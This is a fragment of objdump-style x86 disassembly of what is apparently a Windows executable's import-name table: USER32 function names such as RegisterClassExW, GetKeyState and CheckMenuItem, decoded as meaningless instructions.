  41e2d8:	inc    edi
  41e2d9:	gs je  0x41e329
  41e2dc:	outs   dx,BYTE PTR gs:[esi]
  41e2de:	jne    0x41e2e0
  41e2e0:	adc    eax,DWORD PTR [edx]
  41e2e2:	push   edx
  41e2e3:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  41e2ec:	outs   dx,BYTE PTR ds:[esi]
  41e2ed:	outs   dx,DWORD PTR fs:[esi]
  41e2ef:	ja     0x41e33e
  41e2f1:	gs jae 0x41e367
  41e2f4:	popa   
  41e2f5:	addr16 gs push edi
  41e2f8:	add    BYTE PTR [eax],al
  41e2fa:	push   ebp
  41e2fb:	add    DWORD PTR [edi+0x65],eax
  41e2fe:	je     0x41e353
  41e300:	arpl   WORD PTR [edx+0x6f],si
  41e303:	ins    BYTE PTR es:[edi],dx
  41e304:	ins    BYTE PTR es:[edi],dx
  41e305:	push   eax
  41e306:	outs   dx,DWORD PTR ds:[esi]
  41e307:	jae    0x41e309
  41e309:	add    bh,cl
  41e30b:	add    DWORD PTR [ebp+0x65],ecx
  41e30e:	jae    0x41e383
  41e310:	popa   
  41e311:	addr16 gs inc edx
  41e314:	outs   dx,DWORD PTR ds:[esi]
  41e315:	js     0x41e35c
  41e317:	js     0x41e35a
  41e319:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  41e320:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x65470164
  41e328:	je     0x41e37f
  41e32a:	jo     0x41e390
  41e32c:	popa   
  41e32d:	je     0x41e394
  41e32f:	push   edx
  41e330:	outs   dx,BYTE PTR ds:[si]
  41e332:	add    BYTE PTR [eax],al
  41e334:	mov    dh,0x1
  41e336:	dec    esp
  41e337:	outs   dx,DWORD PTR ds:[esi]
  41e338:	popa   
  41e339:	fs dec ebp
  41e33b:	outs   dx,BYTE PTR gs:[esi]
  41e33d:	jne    0x41e380
  41e33f:	add    BYTE PTR [ecx],cl
  41e341:	add    BYTE PTR [ecx+0x70],al
  41e344:	jo     0x41e3ab
  41e346:	outs   dx,BYTE PTR ds:[esi]
  41e347:	fs dec ebp
  41e349:	outs   dx,BYTE PTR gs:[esi]
  41e34b:	jne    0x41e3a4
  41e34d:	add    BYTE PTR [ebp+0x0],bl
  41e350:	inc    ebx
  41e351:	jb     0x41e3b8
  41e353:	popa   
  41e354:	je     0x41e3bb
  41e356:	dec    ecx
  41e357:	arpl   WORD PTR [edi+0x6e],bp
  41e35a:	dec    ecx
  41e35b:	outs   dx,BYTE PTR ds:[esi]
  41e35c:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  41e364:	ins    BYTE PTR es:[edi],dx
  41e365:	add    DWORD PTR [edi+0x65],eax
  41e368:	je     0x41e3c1
  41e36a:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e371:	outs   dx,BYTE PTR ds:[esi]
  41e372:	addr16 inc ecx
  41e374:	add    BYTE PTR [eax],al
  41e376:	ja     0x41e379
  41e378:	inc    edi
  41e379:	gs je  0x41e3d3
  41e37c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e383:	js     0x41e3f9
  41e385:	dec    esp
  41e386:	outs   dx,BYTE PTR gs:[esi]
  41e388:	addr16 je 0x41e3f3
  41e38b:	push   edi
  41e38c:	add    BYTE PTR [eax],al
  41e38e:	cmp    eax,0x65684300
  41e393:	arpl   WORD PTR [ebx+0x52],bp
  41e396:	popa   
  41e397:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  41e39f:	outs   dx,BYTE PTR ds:[esi]
  41e3a0:	add    BYTE PTR [eax],al
  41e3a2:	add    BYTE PTR [ecx],0x49
  41e3a5:	outs   dx,BYTE PTR ds:[esi]
  41e3a6:	data16 ins BYTE PTR es:[edi],dx
  41e3a8:	popa   
  41e3a9:	je     0x41e410
  41e3ab:	push   edx
  41e3ac:	arpl   WORD PTR gs:[eax+eax*1-0x70],si
  41e3b1:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41e3b5:	arpl   WORD PTR [ebx+0x50],bp
  41e3b8:	outs   dx,DWORD PTR ds:[esi]
  41e3b9:	jo     0x41e430
  41e3bb:	jo     0x41e40a
  41e3bd:	outs   dx,BYTE PTR gs:[esi]
  41e3bf:	jne    0x41e3c1
  41e3c1:	add    BYTE PTR ds:0x6c655202,dl
  41e3c7:	gs popa 
  41e3c9:	jae    0x41e430
  41e3cb:	inc    esp
  41e3cc:	inc    ebx
  41e3cd:	add    BYTE PTR [ebx],ch
  41e3cf:	add    dl,BYTE PTR [ebx+0x65]
  41e3d2:	outs   dx,BYTE PTR ds:[esi]
  41e3d3:	fs dec ebp
  41e3d5:	gs jae 0x41e44b
  41e3d8:	popa   
  41e3d9:	addr16 gs push edi
  41e3dc:	add    BYTE PTR [eax],al
  41e3de:	fild   DWORD PTR [ecx]
  41e3e0:	dec    ebp
  41e3e1:	outs   dx,DWORD PTR ds:[esi]
  41e3e2:	jbe    0x41e449
  41e3e4:	push   edi
  41e3e5:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e3ec:	mov    dl,0x0
  41e3ee:	inc    esp
  41e3ef:	jb     0x41e452
  41e3f1:	ja     0x41e439
  41e3f3:	jb     0x41e456
  41e3f5:	ins    DWORD PTR es:[edi],dx
  41e3f6:	gs inc ebx
  41e3f8:	outs   dx,DWORD PTR ds:[esi]
  41e3f9:	outs   dx,BYTE PTR ds:[esi]
  41e3fa:	je     0x41e46e
  41e3fc:	outs   dx,DWORD PTR ds:[esi]
  41e3fd:	ins    BYTE PTR es:[edi],dx
  41e3fe:	add    BYTE PTR [eax],al
  41e400:	stos   DWORD PTR es:[edi],eax
  41e401:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e405:	fs inc ebx
  41e407:	jne    0x41e47b
  41e409:	jae    0x41e47a
  41e40b:	jb     0x41e44e
  41e40d:	add    BYTE PTR [eax+0x2],ch
  41e410:	push   ebx
  41e411:	gs je  0x41e469
  41e414:	jae    0x41e47b
  41e416:	jb     0x41e467
  41e418:	bound  ebp,QWORD PTR [edx+0x65]
  41e41b:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41e41f:	outs   dx,WORD PTR ds:[esi]
  41e421:	jb     0x41e490
  41e423:	popa   
  41e424:	je     0x41e48f
  41e426:	outs   dx,DWORD PTR ds:[esi]
  41e427:	outs   dx,BYTE PTR ds:[esi]
  41e428:	push   edi
  41e429:	add    BYTE PTR [ecx+0x0],ah
  41e42c:	inc    ebx
  41e42d:	jb     0x41e494
  41e42f:	popa   
  41e430:	je     0x41e497
  41e432:	push   eax
  41e433:	outs   dx,DWORD PTR ds:[esi]
  41e434:	jo     0x41e4ab
  41e436:	jo     0x41e485
  41e438:	outs   dx,BYTE PTR gs:[esi]
  41e43a:	jne    0x41e43c
  41e43c:	xor    al,0x2
  41e43e:	push   ebx
  41e43f:	gs je  0x41e485
  41e442:	ins    BYTE PTR es:[edi],dx
  41e443:	popa   
  41e444:	jae    0x41e4b9
  41e446:	dec    esp
  41e447:	outs   dx,DWORD PTR ds:[esi]
  41e448:	outs   dx,BYTE PTR ds:[esi]
  41e449:	addr16 push edi
  41e44b:	add    BYTE PTR [ebx+0x0],ah
  41e44e:	inc    ebx
  41e44f:	jb     0x41e4b6
  41e451:	popa   
  41e452:	je     0x41e4b9
  41e454:	push   edi
  41e455:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e45c:	push   edi
  41e45d:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  41e464:	outs   dx,DWORD PTR ds:[esi]
  41e465:	outs   dx,BYTE PTR ds:[esi]
  41e466:	imul   esp,DWORD PTR [ebx+0x0],0x49018500
  41e46d:	outs   dx,BYTE PTR ds:[esi]
  41e46e:	jae    0x41e4d5
  41e470:	jb     0x41e4e6
  41e472:	dec    ebp
  41e473:	outs   dx,BYTE PTR gs:[esi]
  41e475:	jne    0x41e4c0
  41e477:	je     0x41e4de
  41e479:	ins    DWORD PTR es:[edi],dx
  41e47a:	push   edi
  41e47b:	add    ah,ah
  41e47d:	add    DWORD PTR [edi+0x66],ecx
  41e480:	data16 jae 0x41e4e8
  41e483:	je     0x41e4d7
  41e485:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e48a:	scas   al,BYTE PTR es:[edi]
  41e48b:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e48f:	fs inc ebx
  41e491:	jne    0x41e505
  41e493:	jae    0x41e504
  41e495:	jb     0x41e4ee
  41e497:	add    BYTE PTR [ebx],al
  41e499:	add    BYTE PTR [ecx+0x64],al
  41e49c:	push   0x75
  41e49e:	jae    0x41e514
  41e4a0:	push   edi
  41e4a1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  41e4a8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41e4ac:	add    BYTE PTR [eax],al
  41e4ae:	js     0x41e4b1
  41e4b0:	inc    edi
  41e4b1:	gs je  0x41e50b
  41e4b4:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e4bb:	js     0x41e531
  41e4bd:	push   edi
  41e4be:	add    BYTE PTR [eax],al
  41e4c0:	push   cs
  41e4c1:	add    DWORD PTR [edi+0x65],eax
  41e4c4:	je     0x41e50a
  41e4c6:	ins    BYTE PTR es:[edi],dx
  41e4c7:	addr16 inc ebx
  41e4c9:	je     0x41e53d
  41e4cb:	ins    BYTE PTR es:[edi],dx
  41e4cc:	dec    ecx
  41e4cd:	inc    esp
  41e4ce:	add    BYTE PTR [eax],al
  41e4d0:	mov    esp,0x6e695702
  41e4d5:	outs   dx,DWORD PTR fs:[esi]
  41e4d7:	ja     0x41e51f
  41e4d9:	jb     0x41e54a
  41e4db:	ins    DWORD PTR es:[edi],dx
  41e4dc:	push   eax
  41e4dd:	outs   dx,DWORD PTR ds:[esi]
  41e4de:	imul   ebp,DWORD PTR [esi+0x74],0x49018300
  41e4e5:	outs   dx,BYTE PTR ds:[esi]
  41e4e6:	jae    0x41e54d
  41e4e8:	jb     0x41e55e
  41e4ea:	dec    ebp
  41e4eb:	outs   dx,BYTE PTR gs:[esi]
  41e4ed:	jne    0x41e530
  41e4ef:	add    BYTE PTR [esi+0x73795302],al
  41e4f5:	je     0x41e55c
  41e4f7:	ins    DWORD PTR es:[edi],dx
  41e4f8:	push   eax
  41e4f9:	popa   
  41e4fa:	jb     0x41e55d
  41e4fc:	ins    DWORD PTR es:[edi],dx
  41e4fd:	gs je  0x41e565
  41e500:	jb     0x41e575
  41e502:	dec    ecx
  41e503:	outs   dx,BYTE PTR ds:[esi]
  41e504:	outs   dx,WORD PTR ds:[esi]
  41e506:	push   edi
  41e507:	add    BYTE PTR [edx],dh
  41e509:	add    DWORD PTR [edi+0x65],eax
  41e50c:	je     0x41e55b
  41e50e:	outs   dx,BYTE PTR gs:[esi]
  41e510:	jne    0x41e55b
  41e512:	je     0x41e579
  41e514:	ins    DWORD PTR es:[edi],dx
  41e515:	inc    ebx
  41e516:	outs   dx,DWORD PTR ds:[esi]
  41e517:	jne    0x41e587
  41e519:	je     0x41e51b
  41e51b:	add    BYTE PTR [ecx+0x4b6b5602],dh
  41e521:	gs jns 0x41e577
  41e524:	arpl   WORD PTR [ecx+0x6e],sp
  41e527:	push   edi
  41e528:	add    BYTE PTR [eax],al
  41e52a:	add    eax,DWORD PTR [edx]
  41e52c:	push   edx
  41e52d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e536:	popa   
  41e537:	jae    0x41e5ac
  41e539:	inc    ebp
  41e53a:	js     0x41e57d
  41e53c:	add    BYTE PTR [eax],al
  41e53e:	ret    
  41e53f:	add    BYTE PTR [ebp+0x6e],al
  41e542:	fs inc esp
  41e544:	imul   esp,DWORD PTR [ecx+0x6c],0x4600676f
  41e54b:	add    BYTE PTR [ebx+0x6c],al
  41e54e:	outs   dx,DWORD PTR ds:[esi]
  41e54f:	jae    0x41e5b6
  41e551:	inc    esp
  41e552:	gs jae 0x41e5c0
  41e555:	je     0x41e5c6
  41e557:	jo     0x41e559
  41e559:	add    BYTE PTR [eax+0x44734901],bl
  41e55f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  41e566:	jae    0x41e5db
  41e568:	popa   
  41e569:	addr16 gs push edi
  41e56c:	add    BYTE PTR [eax],al
  41e56e:	out    0x1,eax
  41e570:	dec    edi
  41e571:	jo     0x41e5d8
  41e573:	outs   dx,BYTE PTR ds:[esi]
  41e574:	inc    esp
  41e575:	gs jae 0x41e5e3
  41e578:	je     0x41e5e9
  41e57a:	jo     0x41e5d3
  41e57c:	add    BYTE PTR [eax],al
  41e57e:	and    BYTE PTR [edx],al
  41e580:	push   ebx
  41e581:	arpl   WORD PTR [edx+0x6f],si
  41e584:	ins    BYTE PTR es:[edi],dx
  41e585:	ins    BYTE PTR es:[edi],dx
  41e586:	push   edi
  41e587:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e58e:	add    BYTE PTR [eax],al
  41e590:	mov    al,ds:0x57734901
  41e595:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e59c:	xor    eax,0x61684300
  41e5a1:	jb     0x41e5f7
  41e5a3:	outs   dx,DWORD PTR ds:[esi]
  41e5a4:	dec    edi
  41e5a5:	gs ins DWORD PTR es:[edi],dx
  41e5a7:	push   edi
  41e5a8:	add    BYTE PTR [eax],al
  41e5aa:	xor    al,BYTE PTR [edx]
  41e5ac:	push   ebx
  41e5ad:	gs je  0x41e5f3
  41e5b0:	popa   
  41e5b1:	jb     0x41e618
  41e5b3:	je     0x41e605
  41e5b5:	outs   dx,DWORD PTR ds:[esi]
  41e5b6:	jae    0x41e5b8
  41e5b8:	daa    
  41e5b9:	add    DWORD PTR [edi+0x65],eax
  41e5bc:	je     0x41e609
  41e5be:	gs jns 0x41e623
  41e5c1:	outs   dx,DWORD PTR ds:[esi]
  41e5c2:	popa   
  41e5c3:	jb     0x41e629
  41e5c5:	push   esp
  41e5c6:	jns    0x41e638
  41e5c8:	gs add bh,ch
  41e5cb:	add    DWORD PTR [eax+0x65],edx
  41e5ce:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  41e5d3:	jae    0x41e636
  41e5d5:	addr16 gs push edi
  41e5d8:	add    BYTE PTR [eax],al
  41e5da:	push   0x74654701
  41e5df:	push   edi
  41e5e0:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  41e5e7:	add    BYTE PTR [ebx+0x72],al
  41e5ea:	gs popa 
  41e5ec:	je     0x41e653
  41e5ee:	inc    esp
  41e5ef:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41e5f6:	jb     0x41e659
  41e5f8:	ins    DWORD PTR es:[edi],dx
  41e5f9:	push   edi
  41e5fa:	add    BYTE PTR [eax],al
  41e5fc:	je     0x41e600
  41e5fe:	push   ebx
  41e5ff:	gs je  0x41e659
  41e602:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e609:	js     0x41e67f
  41e60b:	push   edi
  41e60c:	add    BYTE PTR [eax],al
  41e60e:	xchg   ebx,eax
  41e60f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e613:	je     0x41e687
  41e615:	outs   dx,DWORD PTR ds:[esi]
  41e616:	jns    0x41e659
  41e618:	arpl   WORD PTR [ebx+0x65],sp
  41e61b:	ins    BYTE PTR es:[edi],dx
  41e61c:	gs jb  0x41e680
  41e61f:	je     0x41e690
  41e621:	jb     0x41e677
  41e623:	popa   
  41e624:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e628:	cmc    
  41e629:	add    BYTE PTR [edi+0x65],al
  41e62c:	je     0x41e671
  41e62e:	ins    BYTE PTR es:[edi],dx
  41e62f:	popa   
  41e630:	jae    0x41e6a5
  41e632:	dec    ecx
  41e633:	outs   dx,BYTE PTR ds:[esi]
  41e634:	outs   dx,WORD PTR ds:[esi]
  41e636:	inc    ebp
  41e637:	js     0x41e67a
  41e639:	add    BYTE PTR [ebp+0x1],ch
  41e63c:	inc    edi
  41e63d:	gs je  0x41e697
  41e640:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e647:	outs   dx,BYTE PTR ds:[esi]
  41e648:	addr16 push edi
  41e64a:	add    BYTE PTR [eax],al
  41e64c:	fld    QWORD PTR [eax]
  41e64e:	inc    ebp
  41e64f:	jno    0x41e6c6
  41e651:	popa   
  41e652:	ins    BYTE PTR es:[edi],dx
  41e653:	push   edx
  41e654:	arpl   WORD PTR gs:[eax+eax*1+0x5b],si
  41e659:	add    dl,BYTE PTR [ebx+0x65]
  41e65c:	je     0x41e6b1
  41e65e:	arpl   WORD PTR [edx+0x6f],si
  41e661:	ins    BYTE PTR es:[edi],dx
  41e662:	ins    BYTE PTR es:[edi],dx
  41e663:	push   eax
  41e664:	outs   dx,DWORD PTR ds:[esi]
  41e665:	jae    0x41e667
  41e667:	add    BYTE PTR [edx+0x57734901],ah
  41e66d:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  41e674:	imul   esp,DWORD PTR [ebx+0x6f],0xa6006564
  41e67b:	add    DWORD PTR [ebx+0x69],ecx
  41e67e:	ins    BYTE PTR es:[edi],dx
  41e67f:	ins    BYTE PTR es:[edi],dx
  41e680:	push   esp
  41e681:	imul   ebp,DWORD PTR [ebp+0x65],0x1810072
  41e688:	dec    ecx
  41e689:	outs   dx,BYTE PTR ds:[esi]
  41e68a:	push   ebx
  41e68b:	outs   dx,BYTE PTR gs:[esi]
  41e68d:	fs dec ebp
  41e68f:	gs jae 0x41e705
  41e692:	popa   
  41e693:	addr16 gs inc ebp
  41e696:	js     0x41e698
  41e698:	pop    ebx
  41e699:	add    BYTE PTR [ebx+0x72],al
  41e69c:	gs popa 
  41e69e:	je     0x41e705
  41e6a0:	dec    ecx
  41e6a1:	arpl   WORD PTR [edi+0x6e],bp
  41e6a4:	inc    esi
  41e6a5:	jb     0x41e716
  41e6a7:	ins    DWORD PTR es:[edi],dx
  41e6a8:	push   edx
  41e6a9:	gs jae 0x41e71b
  41e6ac:	jne    0x41e720
  41e6ae:	arpl   WORD PTR [ebp+0x0],sp
  41e6b1:	add    BYTE PTR [edx+0x0],cl
  41e6b4:	inc    ebx
  41e6b5:	outs   dx,DWORD PTR ds:[esi]
  41e6b6:	jo     0x41e731
  41e6b8:	inc    ecx
  41e6b9:	arpl   WORD PTR [ebx+0x65],sp
  41e6bc:	ins    BYTE PTR es:[edi],dx
  41e6bd:	gs jb  0x41e721
  41e6c0:	je     0x41e731
  41e6c2:	jb     0x41e718
  41e6c4:	popa   
  41e6c5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41e6c9:	add    BYTE PTR [esi+0x66654400],cl
  41e6cf:	push   edi
  41e6d0:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41e6d7:	outs   dx,DWORD PTR ds:[esi]
  41e6d8:	arpl   WORD PTR [ecx+0x0],ax
  41e6db:	add    BYTE PTR [ebp+0x79656b02],bh
  41e6e1:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41e6e5:	jbe    0x41e74c
  41e6e7:	outs   dx,BYTE PTR ds:[esi]
  41e6e8:	je     0x41e6ea
  41e6ea:	fadd   QWORD PTR [eax]
  41e6ec:	inc    ebp
  41e6ed:	outs   dx,BYTE PTR ds:[esi]
  41e6ee:	jne    0x41e75d
  41e6f0:	push   edi
  41e6f1:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e6f8:	adc    eax,DWORD PTR [ecx]
  41e6fa:	inc    edi
  41e6fb:	gs je  0x41e742
  41e6fe:	outs   dx,DWORD PTR ds:[esi]
  41e6ff:	jne    0x41e763
  41e701:	ins    BYTE PTR es:[edi],dx
  41e702:	gs inc ebx
  41e704:	ins    BYTE PTR es:[edi],dx
  41e705:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  41e70c:	add    BYTE PTR [eax],al
  41e70e:	cwde   
  41e70f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e713:	je     0x41e787
  41e715:	outs   dx,DWORD PTR ds:[esi]
  41e716:	jns    0x41e76f
  41e718:	imul   ebp,DWORD PTR [esi+0x64],0x2e00776f
  41e71f:	add    BYTE PTR [ebx+0x68],al
  41e722:	popa   
  41e723:	jb     0x41e775
  41e725:	jb     0x41e78c
  41e727:	jbe    0x41e76a
  41e729:	add    BYTE PTR [esi],ah
  41e72b:	add    dl,BYTE PTR [ebx+0x65]
  41e72e:	outs   dx,BYTE PTR ds:[esi]
  41e72f:	fs dec ebp
  41e731:	gs jae 0x41e7a7
  41e734:	popa   
  41e735:	addr16 gs inc ecx
  41e738:	add    BYTE PTR [eax],al
  41e73a:	mov    DWORD PTR [eax],eax
  41e73c:	inc    esp
  41e73d:	gs inc si
  41e740:	jb     0x41e7a3
  41e742:	ins    DWORD PTR es:[edi],dx
  41e743:	gs push eax
  41e745:	jb     0x41e7b6
  41e747:	arpl   WORD PTR [ecx+0x0],ax
  41e74a:	or     al,BYTE PTR [edx]
  41e74c:	push   edx
  41e74d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  41e756:	je     0x41e7a3
  41e758:	gs jns 0x41e75b
  41e75b:	add    BYTE PTR [eax],bh
  41e75d:	add    dl,BYTE PTR [ebx+0x65]
  41e760:	je     0x41e7a5
  41e762:	jne    0x41e7d6
  41e764:	jae    0x41e7d5
  41e766:	jb     0x41e768
  41e768:	push   0x1
  41e76a:	inc    edi
  41e76b:	gs je  0x41e7c5
  41e76e:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41e775:	add    BYTE PTR ds:0x74655302,bh
  41e77b:	inc    esp
  41e77c:	ins    BYTE PTR es:[edi],dx
  41e77d:	addr16 dec ecx
  41e77f:	je     0x41e7e6
  41e781:	ins    DWORD PTR es:[edi],dx
  41e782:	dec    ecx
  41e783:	outs   dx,BYTE PTR ds:[esi]
  41e784:	je     0x41e786
  41e786:	sbb    eax,0x73614300
  41e78b:	arpl   WORD PTR [ecx+0x64],sp
  41e78e:	gs push edi
  41e790:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e797:	add    BYTE PTR [ebx],dh
  41e799:	add    DWORD PTR [edi+0x65],eax
  41e79c:	je     0x41e7eb
  41e79e:	outs   dx,BYTE PTR gs:[esi]
  41e7a0:	jne    0x41e7eb
  41e7a2:	je     0x41e809
  41e7a4:	ins    DWORD PTR es:[edi],dx
  41e7a5:	dec    ecx
  41e7a6:	inc    esp
  41e7a7:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  41e7ae:	outs   dx,DWORD PTR ds:[esi]
  41e7af:	addr16 inc edx
  41e7b1:	outs   dx,DWORD PTR ds:[esi]
  41e7b2:	js     0x41e804
  41e7b4:	popa   
  41e7b5:	jb     0x41e818
  41e7b7:	ins    DWORD PTR es:[edi],dx
  41e7b8:	inc    ecx
  41e7b9:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41e7c0:	arpl   WORD PTR [eax+0x54],bp
  41e7c3:	outs   dx,DWORD PTR ds:[esi]
  41e7c4:	push   esp
  41e7c5:	push   0x69577369
  41e7ca:	outs   dx,BYTE PTR ds:[esi]
  41e7cb:	outs   dx,DWORD PTR fs:[esi]
  41e7cd:	ja     0x41e7cf
  41e7cf:	add    BYTE PTR [eax+eax*1],bh
  41e7d2:	inc    ebx
  41e7d3:	push   0x4d6b6365
  41e7d8:	outs   dx,BYTE PTR gs:[esi]
  41e7da:	jne    0x41e82e
  41e7dc:	popa   
  41e7dd:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41e7e5:	add    ah,al
  41e7e7:	add    DWORD PTR [ebp+0x61],ecx
  41e7ea:	jo     0x41e830
  41e7ec:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41e7f3:	arpl   WORD PTR [eax+eax*1-0x5],si
  41e7f7:	add    DWORD PTR [eax+0x74],edx
  41e7fa:	dec    ecx
  41e7fb:	outs   dx,BYTE PTR ds:[esi]
  41e7fc:	push   edx
  41e7fd:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e802:	cdq    
  41e803:	add    DWORD PTR [ecx+0x73],ecx
  41e806:	inc    esp
  41e807:	ins    BYTE PTR es:[edi],dx
  41e808:	addr16 inc edx
  41e80a:	jne    0x41e880
  41e80c:	je     0x41e87d
  41e80e:	outs   dx,BYTE PTR ds:[esi]
  41e80f:	inc    ebx
  41e810:	push   0x656b6365
  41e815:	add    BYTE PTR fs:[eax],al
  41e818:	mov    edi,0x70737702
  41e81d:	jb     0x41e888
  41e81f:	outs   dx,BYTE PTR ds:[esi]
  41e820:	je     0x41e888
  41e822:	inc    ecx
  41e823:	add    BYTE PTR [ebx+0x1],bl
  41e826:	inc    edi
  41e827:	gs je  0x41e87d
  41e82a:	jns    0x41e89f
  41e82c:	je     0x41e893
  41e82e:	ins    DWORD PTR es:[edi],dx
  41e82f:	dec    ebp
  41e830:	outs   dx,BYTE PTR gs:[esi]
  41e832:	jne    0x41e834
  41e834:	add    al,0x2
  41e836:	push   edx
  41e837:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e840:	popa   
  41e841:	jae    0x41e8b6
  41e843:	inc    ebp
  41e844:	js     0x41e89d
  41e846:	add    BYTE PTR [eax],al
  41e848:	pusha  
  41e849:	add    BYTE PTR [ebx+0x72],al
  41e84c:	gs popa 
  41e84e:	je     0x41e8b5
  41e850:	dec    ebp
  41e851:	outs   dx,BYTE PTR gs:[esi]
  41e853:	jne    0x41e855
  41e855:	add    al,bh
  41e857:	add    BYTE PTR [edi+0x65],al
  41e85a:	je     0x41e89f
  41e85c:	ins    BYTE PTR es:[edi],dx
  41e85d:	popa   
  41e85e:	jae    0x41e8d3
  41e860:	dec    esp
  41e861:	outs   dx,DWORD PTR ds:[esi]
  41e862:	outs   dx,BYTE PTR ds:[esi]
  41e863:	addr16 inc ecx
  41e865:	add    BYTE PTR ds:0x74654701,dh
  41e86b:	dec    ebp
  41e86c:	outs   dx,BYTE PTR gs:[esi]
  41e86e:	jne    0x41e8b9
  41e870:	je     0x41e8d7
  41e872:	ins    DWORD PTR es:[edi],dx
  41e873:	dec    ecx
  41e874:	outs   dx,BYTE PTR ds:[esi]
  41e875:	outs   dx,WORD PTR ds:[esi]
  41e877:	push   edi
  41e878:	add    BYTE PTR [eax],al
  41e87a:	mov    ecx,0x616f4c01
  41e87f:	fs dec ebp
  41e881:	outs   dx,BYTE PTR gs:[esi]
  41e883:	jne    0x41e8dc
  41e885:	add    BYTE PTR [edx+0x1],ah
  41e888:	inc    edi
  41e889:	gs je  0x41e8e0
  41e88c:	outs   dx,DWORD PTR ds:[esi]
  41e88d:	jo     0x41e8e6
  41e88f:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e896:	dec    ebx
  41e897:	add    DWORD PTR [edi+0x65],eax
  41e89a:	je     0x41e8ec
  41e89c:	jb     0x41e90d
  41e89e:	jo     0x41e8f7
  41e8a0:	add    BYTE PTR [eax],al
  41e8a2:	cmp    al,BYTE PTR [edx]
  41e8a4:	push   ebx
  41e8a5:	gs je  0x41e8eb
  41e8a8:	jne    0x41e91c
  41e8aa:	jae    0x41e91b
  41e8ac:	jb     0x41e8fe
  41e8ae:	outs   dx,DWORD PTR ds:[esi]
  41e8af:	jae    0x41e8b1
  41e8b1:	add    bh,al
  41e8b3:	add    DWORD PTR [ebp+0x61],ecx
  41e8b6:	jo     0x41e90e
  41e8b8:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41e8bf:	gs jns 0x41e907
  41e8c2:	js     0x41e91b
  41e8c4:	add    BYTE PTR [eax],al
  41e8c6:	jp     0x41e8ca
  41e8c8:	push   ebx
  41e8c9:	push   0x6143776f
  41e8ce:	jb     0x41e935
  41e8d0:	je     0x41e8d2
  41e8d2:	add    eax,0x67655202
  41e8d7:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41e8de:	popa   
  41e8df:	jae    0x41e954
  41e8e1:	push   edi
  41e8e2:	add    BYTE PTR [eax],al
  41e8e4:	scas   eax,DWORD PTR es:[edi]
  41e8e5:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e8e9:	fs dec ecx
  41e8eb:	arpl   WORD PTR [edi+0x6e],bp
  41e8ee:	inc    ecx
  41e8ef:	add    bl,dh
  41e8f1:	add    BYTE PTR [edi+0x65],al
  41e8f4:	je     0x41e939
  41e8f6:	popa   
  41e8f7:	jb     0x41e95e
  41e8f9:	je     0x41e94b
  41e8fb:	outs   dx,DWORD PTR ds:[esi]
  41e8fc:	jae    0x41e8fe
  41e8fe:	jnp    0x41e902
  41e900:	push   ebx
  41e901:	push   0x7543776f
  41e906:	jb     0x41e97b
  41e908:	outs   dx,DWORD PTR ds:[esi]
  41e909:	jb     0x41e90b
  41e90b:	add    BYTE PTR [eax+0x1],bl
  41e90e:	inc    edi
  41e90f:	gs je  0x41e965
  41e912:	jne    0x41e976
  41e914:	dec    ebp
  41e915:	outs   dx,BYTE PTR gs:[esi]
  41e917:	jne    0x41e919
  41e919:	add    cl,al
  41e91b:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  41e91f:	imul   esi,DWORD PTR [ebp+0x70],0x49
  41e923:	arpl   WORD PTR [edi+0x6e],bp
  41e926:	dec    ecx
  41e927:	fs inc esi
  41e929:	jb     0x41e99a
  41e92b:	ins    DWORD PTR es:[edi],dx
  41e92c:	inc    esp
  41e92d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41e934:	jns    0x41e936
  41e936:	push   ebp
  41e937:	push   ebx
  41e938:	inc    ebp
  41e939:	push   edx
  41e93a:	xor    esi,DWORD PTR [edx]
  41e93c:	cs fs ins BYTE PTR es:[edi],dx
